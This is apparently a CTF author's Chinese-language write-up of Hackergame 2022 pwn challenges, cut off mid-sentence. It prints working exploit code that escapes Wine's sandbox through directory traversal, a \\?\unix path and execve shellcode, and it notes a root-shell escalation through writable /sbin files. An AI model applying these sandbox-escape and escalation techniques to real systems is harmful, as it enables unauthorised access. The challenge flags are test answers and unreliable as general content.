---
name: hackergame-2022
challenges:
-   name:   winepenguin
    tag:    wine | shellcode
    link:   [link](hackergame-2022/winepenguin)
    solved: true
-   name:   no\_open
    tag:    syscall
    link:   [link](hackergame-2022/no_open)
    solved: true
-   name:   kanata
    tag:    
    link:   [202.38.93.111 10338](hackergame-2022/kanata)
    solved: true
-   name:   homogame
    tag:    
    link:   [link](hackergame-2022/homogame)
    solved: true
-   name:   one\_byte\_man
    tag:    mmap
    link:   [link](hackergame-2022/one_byte_man)
    solved: true
-   name:   evilCallback
    tag:    v8
    link:   [link](hackergame-2022/evilCallback)
    solved: true
---

> 从 2020 年入学以来这是我经历的第三次 hackergame 了，不过今年是以出题人的身份参加的。
>
> ~~（考虑到自己 `math: 0` 的水平，就算认真去肝七天也很难取得比 20 年更好的成绩了）~~
>
> 刚开始学二进制的时候，原因只是「这个方向好像很缺人」，跟着战队打比赛一直也只是堆题签个到走人的水平。直到今年暑假连着参加了几场线下赛（虽然个人贡献 $\approx$ 0），但见识了很多高质量的赛题，也开始思考 pwn 在赛题以外的意义。
>
> 今年的 evilCallback 就是在这种背景下诞生的——一道比较接近 RealWorld 的二进制漏洞利用题。

## 杯窗鹅影

这道题有几种解法，标准解法应该是在 wine 中调用 linux 下的 syscall 实现 flag 的读取，但是有人发现可以用相对路径读到 `/flag1`：

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
int main() {
    int fd = open("../../../../../../../../../flag1", 0, 0);
    char buf[0x100];
    read(fd, buf, 0x100);
    puts(buf);

    return 0;
}
// flag{Surprise_you_can_directory_traversal_1n_WINE_a4b4853859}
```

于是加上了第二问，但正如[官方 wp](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E6%9D%AF%E7%AA%97%E9%B9%85%E5%BD%B1/README.md) 中说的，wine 中根目录下的文件 `/flag` 有等价路径 `\\?\unix\flag`，故第二问同样可以不用 shellcode 解决：

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    execve("\\\\?\\unix\\readflag", 0, 0);
    return 0;
}
```

再看一下标准做法，用 `shellcraft.sh("/readflag")` 生成的汇编代码即可：

```c
// x86_64-w64-mingw32-gcc ./exp2.c -o exp2.exe -masm=intel
#include <stdio.h>
int main() {
    __asm__(
            "push 0x67;"
            "mov rax, 0x616c66646165722f;"
            "push rax;"
            "mov rdi, rsp;"
            "xor rsi, rsi;"
            "xor rdx, rdx;"
            "mov rax, 0x3b;"
            "syscall;"
            );
    return 0;
}
// flag{W1ne_is_NeveR_a_SaNDB0x_ad2970bd4f}
```

---

## 传达不到的文件

> 这道题由于权限相关设置有问题，比赛中出现了几种非预期解 ~~（比赛前一周我在学校里是比较闲的，本来也打算测试一下这几道题，帮验题人分担一点工作量，结果自己的题考虑不周一直修到了最后一天的半夜，还耽误了验题学长大量时间😭😭，间接导致了「权限问题」这样的非预期）~~

由于 `sbin` 内文件的 owner 是 1000，其中文件是可以随便更改的，因此赛后也是传出了五花八门的非预期，大体思路围绕 `/etc/init.d/rcS`：

```sh
#! /bin/sh

mkdir -p /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp
mdev -s

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

chown 0:0 /chall
chmod 04111 /chall

cat /dev/sda > /flag2
chown 1337:1337 /flag2
chmod 0400 /flag2

setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /tmp


poweroff -d 0  -f
```

例如在 shell 中直接执行 `rm /sbin/poweroff; exit` 就获得了 root 权限的 shell，进而得到两个 flag。

#### task1-读不到

第一问的预期解法实则是利用 ptrace dump 整个
